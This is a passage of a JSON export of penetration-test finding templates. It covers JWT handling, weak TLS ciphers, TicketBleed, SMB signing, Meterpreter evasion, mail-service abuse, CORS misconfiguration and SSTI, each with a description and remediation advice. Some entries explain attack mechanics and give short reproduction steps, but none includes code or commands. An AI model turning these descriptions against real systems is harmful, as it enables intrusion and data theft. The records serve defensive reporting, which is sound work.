03:12:06","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":1104,"plugin_id":null,"title":"JSON Web Token Not Invalidated After Logout","type":"PT","description":"The JWT token used for authentication and authorization of application is not invalidated on the server after the user initiates log out from the main application portal. User JWT session token remains active on the server for one month from the time of generation, and any requests submitted including the user's JWT session token will execute successfully, as though the user had made those requests. \r\nLeaving the user's JWT session token active after the user initiates logout provides the attacker with a larger window in which to steal a victim's session and impersonate that user in the integrated applications. The JWT session token can be obtained through various techniques, such as intercepting network traffic (\"Man-in-the-Middle\" or \"MitM\"), Cross-Site Scripting (XSS), Cross-Site Tracing (XST), and in the case of URL-based session token transmission, local inspection of browser history. In addition to prolonging the session identifier's exposure to attack, failing to invalidate the user's session server-side also leaves the user with no way to deny an attacker's access once the victim discovers that their session has been compromised.","poc":null,"impact":null,"remediation":"The user's JWT session token should be terminated on the server immediately after a logout action is performed. It is important to note that simply deleting the cookie from the browser will not terminate the server session. The session must be invalidated at the server. \r\nThis problem is inherent to JWT because a token becomes only invalid when it expires. The user has no built-in feature to explicitly revoke the validity of a token. This means that if it is stolen, a user cannot revoke the token itself and then block the attacker.\r\nA way to protect is to implement a token blacklist that will be used to mimic the \"logout\" feature that exists with traditional session system. The blacklist will keep a digest (SHA-256 encoded in HEX) of the token with a revocation date, this, for a duration that must be superior to the duration validity of an issued token. When the user wants to \"logout\" then it calls a dedicated service that will add the provided user token to the blacklist resulting in an immediate invalidation of the token for further usage in the application.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-11-28 05:25:11","updated_at":"2019-11-28 05:25:11","approved":0,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":1105,"plugin_id":null,"title":"Lack of Forward Secrecy in Supported Cipher Suites","type":"PT","description":"The application server-side SSL/TLS endpoint is configured to allow weak SSL/TLS cipher suites that do not support forward secrecy. Such cipher suites are not supported by the upcoming TLSv1.3 standard. A server-side SSL/TLS endpoint that supports weak ciphers could allow an attacker to decrypt previously saved data if the server certificate private key is compromised. These cipher suites have proven cryptographic flaws that can allow an attacker to decrypt traffic. These weak cipher suites include the following:\r\n--Cipher suites that use TLS_RSA_* block ciphers (e.g. AES, 3DES) in CBC mode for encryption; These ciphers contain several known weaknesses. In particular, it is vulnerable to the ROBOT attack. They also don’t use ephemeral keys, hence there is no forward secrecy. Forward secrecy protects the decryption of historical encrypted data if the certificate private key is compromised.","poc":null,"impact":null,"remediation":"Forward secrecy (sometimes also called perfect forward secrecy) is a protocol feature that enables secure conversations that are not dependent on the server’s private key. With cipher suites that do not provide forward secrecy, someone who can recover a server’s private key can decrypt all earlier recorded encrypted conversations. \r\n--Prefer ECDHE suites in order to enable forward secrecy with modern web browsers. \r\n--To support a wider range of clients, DHE suites should be used as fall-back after ECDHE. \r\n--Avoid the RSA key exchange unless absolutely necessary. \r\n--The server-side TLS endpoint's configuration should be updated to allow only TLSv1.2 connections with cipher suites that use ephemeral keys and an AEAD mode.\r\nNote: https://robotattack.org/","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-11-28 05:31:05","updated_at":"2019-11-28 05:31:05","approved":0,"v_likelihood":"Low","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":1106,"plugin_id":null,"title":"JWT Token information disclosure","type":"VA","description":"We have discovered that an attacker can access JWT token and extract information stored into it (JWT token information is base64 encoded at the basis) and can obtain information about the system. Information can be for example the security roles, User PII, email. This can also lead to an information leak if tokens are logged e.g. WAF, Cloud-trails.","poc":null,"impact":null,"remediation":"Information in the JWT token can be protected by ciphering. Ciphering is added mainly to hide internal information but it's very important to remember that the first protection against tampering of the JWT token is the signature so, the token signature and is verification must be always in place.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-11-28 05:34:10","updated_at":"2021-02-10 08:46:54","approved":1,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":1107,"plugin_id":null,"title":"Server Vulnerable to “TicketBleed” vulnerability","type":"PT","description":"We discovered that the application server TLS stack is vulnerable to “TicketBleed” vulnerability. TicketBleed (CVE-2016-9244) is a software vulnerability in the TLS stack of certain F5 products that allows a remote attacker to extract up to 31 bytes of uninitialized memory at a time, which can contain any kind of random sensitive information, like in Heartbleed.\r\nThe vulnerability lies in the implementation of Session Tickets, a resumption technique used to speed up repeated connections. When a client supplies a Session ID together with a Session Ticket, the server is supposed to echo back the Session ID to signal acceptance of the ticket. Session IDs can be anywhere between 1 and 31 bytes in length. The F5 stack always echoes back 32 bytes of memory, even if the Session ID was shorter. An attacker providing a 1-byte Session ID would then receive 31 bytes of uninitialized memory.\r\nA remote attacker may exploit this vulnerability to obtain Secure Sockets Layer (SSL) session IDs from other sessions. It is possible that other data from uninitialized memory may be returned as well.","poc":null,"impact":null,"remediation":"Disabling Session Tickets is complete mitigation, which will only cause performance degradation in the set-up phase of resumed connections.\r\nThe full list of affected versions is available on the F5 website. At the time of this public disclosure, not all releases have upgrade candidates available.\r\nNote: https://filippo.io/ticketbleed/","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-11-28 07:20:07","updated_at":"2019-11-28 07:20:07","approved":0,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":1108,"plugin_id":null,"title":"SMB Packet Signing Not Enforced","type":"PT","description":"It was observed that the SMB signing is disabled or is not enforced on the host, potentially exposing data to eavesdropping attacks in transit. SMB signing is a protocol feature used to sign SMB packets so that the client and server know that they are communicating directly to one another without any data interception and re-transmission by an attacker sitting between the client and server. When this setting is enforced (required), a client is required to support SMB signing in order to connect. Once a client connects to the server, all server message block data sent between the systems will be signed by both the client and the server, so both systems can verify the authenticity of the data being transmitted by the other system. This feature has been available for Windows clients since Windows NT 4 SP3.  \r\nDue to SMB signing being disabled, man-in-the-middle attacks against this system are possible, exposing any sensitive data being transmitted over the network. An attacker could exploit this by performing an SMB relay attack, which waits for authentication attempts from a highly privileged account and redirects them to the affected system. Once the redirected authorization attempt succeeds, the affected system will think that the attacker's system is authorized because of the privileged account being used in the attack. If SMB signing were enabled, this type of SMB relay attack would fail.","poc":null,"impact":null,"remediation":"Enforce SMB signing on the server via Local Policies or globally using Group Policy. Simply allowing SMB signing, but not mandating its use will not fully mitigate this vulnerability, so it must be mandatory. Use the group policy setting in the following guide to mandate SMB packet signing:\r\nNote: https://technet.microsoft.com/en-us/library/Cc786681(v=WS.10).aspx","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-11-28 07:25:43","updated_at":"2019-11-28 07:25:43","approved":0,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":1109,"plugin_id":null,"title":"Meterpreter Executable Not Blocked","type":"PT","description":"We observed that if any known malicious executable like Meterpreter reverse shell is copied and executed, endpoint protection is unable to contain and block it. Meterpreter shell can enable an attacker to run exploits on the VM and use it as a pivot to scan associated infrastructure for vulnerabilities.","poc":null,"impact":null,"remediation":"Use Windows software restriction policies to prevent the user from running unauthorized applications. This can be achieved by whitelisting a certain number of binaries required for the standard use case. Alternatively, the restriction policy could be configured to allow any executable to run that is signed by a specific set of security certificates.\r\nThe virus definition of endpoint security should be regularly updated to detect malicious executable like Meterpreter reverse shells.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-11-28 07:28:01","updated_at":"2019-11-28 07:28:01","approved":0,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":1138,"plugin_id":null,"title":"Potential Abuse of Mail Service","type":"PT","description":"We discovered that unauthenticated users can interact with email handling service by sending an email to [Email Address]. When an email is sent to [Email Address], an automated response is sent back to the user. If the CC field is utilized during the email, the automated replies are also sent to the CC addresses.  \r\nWe observed that there is no limitation on outgoing emails. It is possible for a malicious user to craft many emails along with invalid CC addresses and send it to [Email Address]. The application will reply to all the recipients, including CC addresses, which will trigger a large amount of bounce rate. A large number of bounced emails could result in the mail account being blocked by [Email Service Provider] as SPAM or domain blacklisting as Spammer.","poc":null,"impact":null,"remediation":"To address this issue, consider the following recommendations.\r\n--Limit the reply to authorized emails associated with a valid account.\r\n--Introduce rate limit on outgoing emails and implement email bounce rate monitoring. \r\n--Use dedicated email sending system supporting delivery optimization and email validation features with dedicate IP.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2020-03-04 08:19:41","updated_at":"2020-03-04 08:19:41","approved":0,"v_likelihood":"High","v_impact":"Critical","steps_to_reproduce":"1.\tInitiate an email to [Email Address] using any valid/invalid email address.\r\n2.\tInclude any valid/invalid email in CC\r\n3.\tSend the email and observe the response to view tickets generated for valid email addresses and bounce back email for invalid email addresses.","likelihood_text":null},{"id":1139,"plugin_id":null,"title":"Lack of Key Rotation Policy","type":"PT","description":"The application protects the confidentiality of the data using encryption. Some use cases we found were including encryption user’s cookie, session tokens, and credentials in the configuration files.\r\nLack of frequent key rotation policy presents the following problems: --In an event when the key is compromised, the entire data (since the one key was used) would be exposed to the attackers\r\n--No protection against brute force cryptanalysis attacks. Since a large amount of data is encrypted with the constant key, there is no way to limit the amount of information that could be used for cryptanalysis by the attackers\r\n--Leads to cryptographic catastrophic failures. For e.g., AES GCM mode loses protection if more than 64 GB is encrypted using the same key. See NIST SP 800-38D section 5.2.1.1\r\n\r\nFrequent Cryptographic key rotation is a recommended security practice and solves all of the above challenges. Note that some industry compliance also requires frequent key rotation.","poc":null,"impact":null,"remediation":"The cryptographic key must be rotated frequently. Hardware Security Modules (HSM) or Key Management solution should be adopted to handle the cryptographic key lifecycle, including key generation, key rotation, key versioning, and revocation.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2021-01-27 19:30:40","updated_at":"2021-01-27 19:30:40","approved":0,"v_likelihood":"Minimal","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":1331,"plugin_id":null,"title":"Cross-origin resource sharing: Arbitrary Origin trusted","type":"PT","description":"An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.\r\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.\r\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.","poc":null,"impact":null,"remediation":"Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2022-09-22 14:34:16","updated_at":"2022-09-22 14:34:27","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":"- Send in a request with an Origin header set to an arbitrary value\r\n- Inspect the server response where you can see that the application accepted the origin, and the Allow-Credentials header is set to true.","likelihood_text":null},{"id":1332,"plugin_id":null,"title":"JWT Contains Sensitive Information","type":"PT","description":"Sensitive information is returned to the client in a JWT. JWTs are tokens that an OAuth Authorization Server or an Identity Provider returns to the client after successful authentication. The sensitive information can be accessed by anyone with access to those tokens.","poc":null,"impact":"Sensitive information may be leaked to unauthorized users. If the client is shared between multiple users or a remote attacker manages to install malware on the client, an attacker may be able to access JWTs and obtain access to its information. The impact on the user and the application will vary depending on the type of sensitive data within the JWT, leaking personally identifiable information about the victim may lead to identity theft.","remediation":"Remove sensitive information from the JWT. If the JWT needs to contain sensitive information, then encrypt the sensitive information before sharing it with the client by using JWE.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2022-09-22 15:22:47","updated_at":"2022-09-22 15:22:53","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":1333,"plugin_id":null,"title":"Server-Side Template Injection","type":"VA","description":"The application is vulnerable to Server-Side Template Injection (SSTI) because it utilizes a template engine and is embedding user input unsafely into templates. This may enable an attacker to compromise the internal components of the web server.\r\n\r\nTemplate engines are used by many web applications and frameworks to generate dynamic content based on various data, including user-supplied input.\r\n\r\nIncorrect or unsafe use of template engines that allow an attacker to supply template syntax native to the engine can be abused to inject and execute malicious payloads.  The supplied malicious payloads are processed within the server, which in turn allows the attacker to manipulate internal server components pertaining to the template engine and in severe cases, gain full control of the server.","poc":null,"impact":"The full capabilities of an SSTI vulnerability vary based on the template engine that is utilized by the application. However, in many cases, the vulnerability could have a range of severe effects on the server, including (but not limited to) the following: -- Full system compromise\r\n-- Remote code execution\r\n-- Enumeration of internal server components\r\n-- Full information disclosure due to sensitive data access\r\n-- Denial of service","remediation":"Use static template files wherever possible, and avoid the use of untrusted input, such as user-supplied data, when generating dynamic templates. Always use template parameters to include user-supplied data safely in the output when a template is processed.\r\n\r\nHowever, if it is not possible to prevent user-supplied content in templates due to business requirements, consider utilizing a logic-less template engine such as Mustache. Logic-less template engines typically provide only the most basic functionalities required to fill data into templates, thus eliminating the possibility for a malicious user to leverage the component to execute dangerous functions. \r\nAs a last option, to reduce the risk from user-supplied data in dynamically generated templates, apply strict input validation and sanitization together with execution of templates in a sandboxed and locked down environment to reduce the likelihood and impact of potential template injections.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2022-10-04 15:45:46","updated_at":"2022-10-04 15:45:57","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null}]